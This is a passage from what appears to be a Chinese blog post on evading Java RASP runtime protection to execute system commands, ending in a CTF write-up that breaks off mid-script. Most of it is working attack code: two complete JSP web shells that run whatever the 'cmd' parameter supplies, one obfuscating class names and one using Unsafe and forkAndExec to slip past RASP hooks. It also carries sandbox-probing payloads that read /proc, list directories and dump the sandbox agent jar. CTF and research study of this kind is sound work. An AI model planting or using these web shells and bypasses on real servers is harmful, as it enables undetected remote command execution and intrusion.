(<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span>[] envc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">byte</span>[] envBlock = ProcessEnvironment.toEnvironmentBlock(environment, envc);<br><br>        <span class="hljs-type">int</span>[] std_fds;<br><br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (redirects == <span class="hljs-literal">null</span>) &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[] &#123; -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span> &#125;;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">1</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">1</span>].file(),<br>                                              redirects[<span class="hljs-number">1</span>].append());<br>                    std_fds[<span class="hljs-number">1</span>] = fdAccess.get(f1.getFD());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">2</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">2</span>].file(),<br>                                              redirects[<span class="hljs-number">2</span>].append());<br>                    std_fds[<span class="hljs-number">2</span>] = fdAccess.get(f2.getFD());<br>                &#125;<br>            &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UNIXProcess</span><br>            (toCString(cmdarray[<span class="hljs-number">0</span>]),<br>             argBlock, args.length,<br>             envBlock, envc[<span class="hljs-number">0</span>],<br>             toCString(dir),<br>                 std_fds,<br>             redirectErrorStream);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close(); &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close(); &#125;<br>                <span class="hljs-keyword">finally</span> &#123; <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close(); &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>UNIXProcess接收 8个参数，其中envc是[1]与std_fds都是恒为-1的数组，redirectErrorStream不影响可为false，args.length 为 cmd.length - 1，argBlock的内容就是执行的命令内容。</p></blockquote><p>一个jsp的payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>, result, <span class="hljs-number">0</span>, bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    InputStream <span class="hljs-title function_">start</span><span class="hljs-params">(String[] strs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// java.lang.UNIXProcess</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">unixClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">73</span>, <span class="hljs-number">88</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>&#125;);<br>        <span class="hljs-comment">// java.lang.ProcessImpl</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// 反射创建UNIXProcess或者ProcessImpl</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            clazz = Class.forName(unixClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            clazz = Class.forName(processClass);<br>        &#125;<br>        <span class="hljs-comment">// 获取UNIXProcess或者ProcessImpl的构造方法</span><br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">assert</span> strs != <span class="hljs-literal">null</span> &amp;&amp; strs.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span><br>        <span class="hljs-comment">// memory management in Java than in C.</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>        &#125;<br>        <span class="hljs-type">int</span>[] envc    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// In theory, close() can throw IOException</span><br>        <span class="hljs-comment">// (although it is rather unlikely to happen here)</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close();<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 创建UNIXProcess或者ProcessImpl实例</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> constructor.newInstance(<br>                toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        );<br>        <span class="hljs-comment">// 获取命令执行的InputStream</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">inMethod</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        inMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (InputStream) inMethod.invoke(object);<br>    &#125;<br>    String <span class="hljs-title function_">inputStreamToString</span><span class="hljs-params">(InputStream in, String charset)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (charset == <span class="hljs-literal">null</span>) &#123;<br>                charset = <span class="hljs-string">&quot;UTF-8&quot;</span>;<br>            &#125;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>   <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[]                b   = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                out.write(b, <span class="hljs-number">0</span>, a);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(out.toByteArray());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>)<br>                in.close();<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] str = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span>     <span class="hljs-operator">=</span> start(str);<br>        <span class="hljs-type">String</span>      <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> inputStreamToString(in, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(result);<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="unsafeforkandexec绕过"><a href="#Unsafe-forkAndExec绕过" class="headerlink" title="Unsafe+forkAndExec绕过"></a>Unsafe+forkAndExec绕过</h2><p>那如果RASP把<code>UNIXProcess/ProcessImpl</code>类的构造方法给拦截了呢</p><p>那我们就需要利用java的一些特性来直接触发<code>forkAndExec</code>方法从而绕过过滤</p><p>具体的步骤如下：</p><ol><li>使用<code>sun.misc.Unsafe.allocateInstance(Class)</code>特性可以无需<code>new</code>或者<code>newInstance</code>创建<code>UNIXProcess/ProcessImpl</code>类对象。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>forkAndExec</code>方法。</li><li>构造<code>forkAndExec</code>需要的参数并调用。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>initStreams</code>方法初始化输入输出结果流对象。</li><li>反射<code>UNIXProcess/ProcessImpl</code>类的<code>getInputStream</code>方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。</li></ol><p>因为不太好验证，直接copy一下Aiwin师傅的jsp payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] strs = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (strs != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>); <span class="hljs-comment">//通过get方法得到unsafe对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<span class="hljs-comment">//创建UNIXProcess对象</span><br>        <span class="hljs-comment">//原代码</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-comment">//构造forkAndExec需要的参数</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>        helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//从UNIXProcess中得到launchMechanism和Helperpath</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>        <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br>       <span class="hljs-comment">//反射forkAndExec方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>        &#125;);<br>        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        &#125;);<br>        <span class="hljs-comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        initStreamsMethod.invoke(processObject, std_fds);<br>        <span class="hljs-comment">//获取输出内容</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>    <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(b, <span class="hljs-number">0</span>, a);<br>        &#125;<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(baos.toString());<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><h2 id="mrctf-2022-springcoffee"><a href="#MRCTF-2022-springcoffee" class="headerlink" title="[MRCTF 2022] springcoffee"></a>[MRCTF 2022] springcoffee</h2><h2 id="强网拟态2024-onlinerunner"><a href="#强网拟态2024-OnlineRunner" class="headerlink" title="强网拟态2024 OnlineRunner"></a>强网拟态2024 OnlineRunner</h2><p>记得当时题目是一个在线的java在线命令执行环境，直接让你写Main函数的部分，所以也没办法import类，只能直接写全类名</p><p>当时就是尝试了一下正常命令执行payload发现不太行，java沙箱也不太会绕不过去，遂摆🫡</p><p>这题没有附件，当时也没怎么看，现在只能看wp学习一下</p><p>先是用下面的payload任意文件读</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.io.<span class="hljs-type">FileReader</span> <span class="hljs-variable">fr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileReader(<span class="hljs-string">&quot;/proc/1/cmdline&quot;</span>);<br>            java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(fr);<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                System.out.println(line);<br>            &#125;<br>            br.close();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后得到启动服务的参数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java--add-opens=java.base/java.lang=ALL-UNNAMED-javaagent:/home/ctf/sandbox/lib/sandbox-agent.jar-jar/app/app.jar--server.port=80<br></code></pre></td></tr></table></figure><p>这里可以看到是给沙箱上了一个agent来检测程序，也就是RASP了</p><p>然后用下面的payload来列目录</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.io.<span class="hljs-type">File</span> <span class="hljs-variable">folder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/&quot;</span>);<br>        java.io.File[] listOfFiles = folder.listFiles();<br><br>        <span class="hljs-keyword">if</span> (listOfFiles != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (java.io.File file : listOfFiles) &#123;<br>                <span class="hljs-keyword">if</span> (file.isFile()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;File: &quot;</span> + file.getName());<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file.isDirectory()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Directory: &quot;</span> + file.getName());<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;The directory does not exist or is not a directory.&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>下面的payload看jar包的条目信息，也就是一些包含的文件和目录信息</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.util.zip.<span class="hljs-type">ZipInputStream</span> <span class="hljs-variable">zis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.zip.ZipInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(<span class="hljs-string">&quot;/app/app.jar&quot;</span>));<br>    java.util.zip.ZipEntry entry;<br>    <span class="hljs-keyword">while</span> ((entry = zis.getNextEntry()) != <span class="hljs-literal">null</span>) &#123;<br>        System.out.println(entry.getName());<br>        zis.closeEntry();<br>    &#125;<br>    zis.close();<br>&#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p>用下面的payload下载agent.jar然后反编译查看源码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    java.io.<span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(<span class="hljs-string">&quot;/home/ctf/sandbox/lib/sandbox-agent.jar&quot;</span>); <span class="hljs-comment">// 需要读取的二进制文件</span><br><br>    java.io.<span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedInputStream(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.FileInputStream(file));<br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 创建一个字节数组作为缓冲区</span><br>            <span class="hljs-type">int</span> bytesRead;<br><br>            <span class="hljs-keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 循环读取</span><br>                <span class="hljs-comment">// 处理读取的数据（这里可以进行打印、处理等）</span><br>                <span class="hljs-comment">//System.out.write(buffer, 0, bytesRead);</span><br>System.out.print(<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>                System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));<br>System.out.println(<span class="hljs-string">&quot;\&quot;,&quot;</span>);<br><br>            &#125;<br><br><br>        &#125; <span class="hljs-keyword">catch</span> (<br>java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后python脚本写入jar包</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>data = [<span 